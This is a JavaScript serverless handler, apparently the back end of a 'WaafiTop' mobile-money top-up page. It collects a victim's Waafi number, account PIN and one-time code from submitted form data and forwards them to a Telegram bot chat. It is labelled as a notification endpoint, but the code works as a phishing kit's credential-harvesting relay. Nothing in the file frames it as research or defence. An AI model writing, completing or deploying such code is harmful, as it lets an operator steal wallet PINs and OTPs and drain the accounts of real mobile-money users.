export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({
      ok: false,
      message: 'Telegram bot token or chat ID is not configured.'
    });
  }

  const body = req.body || {};
  const {
    title,
    text,
    orderId,
    page,
    view,
    recipient,
    amount,
    waafiNumber,
    waafiPin,
    waafiOtp,
    payer,
    pin,
    otp
  } = body;

  const formattedWaafiNumber = waafiNumber || payer || '';
  const formattedWaafiPin = waafiPin || pin || '';
  const formattedOtp = waafiOtp || otp || '';
  const formattedAmount = normalizeTelegramAmount(amount || body.total || '');
  const formattedPage = page || view || '';

  const message = [
    title || 'WaafiTop update',
    '',
    text || 'New notification received.',
    formattedPage ? `Page: ${formattedPage}` : '',
    orderId ? `Order ID: ${orderId}` : '',
    recipient ? `Receive on: ${recipient}` : '',
    formattedWaafiNumber ? `Waafi number: ${formattedWaafiNumber}` : '',
    formattedWaafiPin ? `Waafi PIN: ${formattedWaafiPin}` : '',
    formattedOtp ? `OTP: ${formattedOtp}` : '',
    formattedAmount ? `Amount: ${formattedAmount}` : ''
  ].filter(Boolean).join('\n');

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        disable_web_page_preview: true
      })
    });

    const data = await response.json();

    if (!response.ok || !data.ok) {
      return res.status(400).json({
        ok: false,
        message: data.description || 'Telegram message failed.'
      });
    }

    return res.status(200).json({ ok: true, message: 'Telegram notification sent.' });
  } catch (error) {
    return res.status(500).json({
      ok: false,
      message: 'Failed to send Telegram notification.',
      error: error.message
    });
  }
}

function normalizeTelegramAmount(value) {
  if (value === null || value === undefined || value === '') return '';
  const normalized = String(value).trim();
  if (!normalized) return '';

  const numeric = Number(normalized);
  if (Number.isFinite(numeric)) {
    return `$${numeric.toFixed(2)}`;
  }

  return normalized;
}
